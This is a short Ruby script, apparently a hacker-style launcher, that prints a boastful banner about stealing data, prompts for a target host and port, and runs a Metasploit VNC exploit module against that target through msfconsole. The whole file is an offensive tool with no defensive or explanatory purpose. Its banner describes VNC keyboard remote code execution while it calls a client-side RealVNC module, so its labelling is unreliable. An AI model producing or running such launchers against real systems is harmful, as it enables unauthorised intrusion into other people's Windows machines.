require 'colorize'
puts """

 	     Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  
        1st Try {set RPORT 80; 2nd RPORT 8080}

          VNC Keyboard Remote Code Execution

		        VNC Windows / Powershell
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? [Default is 5900]".blue
print " [!] ---> ".yellow
port = gets.chomp






exec("msfconsole -x 'use exploit/windows/vnc/realvnc_client' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

